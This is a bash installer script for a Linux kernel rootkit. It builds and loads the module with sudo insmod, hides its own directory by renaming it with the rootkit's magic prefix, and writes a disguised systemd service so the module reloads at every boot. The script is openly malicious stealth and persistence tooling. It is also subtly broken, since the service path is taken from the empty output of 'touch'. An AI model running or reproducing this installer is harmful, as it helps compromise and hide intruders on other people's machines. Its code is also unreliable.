#!/bin/bash

make

koFile=$(ls *.ko)
hFile=$(ls *.h)
if test -f "$koFile"; then
    
    # Load the rootkit's kernel module:
    sudo insmod "$koFile"

    # Hide current directory via MAGIC_PREFIX:
    magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
    thisDirPath=$(pwd)
    thisDir=${PWD##*/}
    mv "$thisDirPath" '../'"$magicPrefix""$thisDir"

    # Load rootkit on boot:
    loadServicePath=$(touch "/etc/systemd/system/""$magicPrefix""load.service")
    echo "[Unit]" >> "$loadServicePath"
    echo "Description=Joe Mamma" >> "$loadServicePath"
    echo "After=multi-user.target" >> "$loadServicePath"
    echo "" >> "$loadServicePath"
    echo "[Service]" >> "$loadServicePath"
    echo "Type=simple" >> "$loadServicePath"
    echo "RemainAfterExit=yes" >> "$loadServicePath"
    echo "ExecStart=insmod $koFile" >> "$loadServicePath"
    echo "TimeoutStartSec=0" >> "$loadServicePath"
    echo "" >> "$loadServicePath"
    echo "[Install]" >> "$loadServicePath"
    echo "WantedBy=default.target" >> "$loadServicePath"    

    # Others:

    echo "built."
fi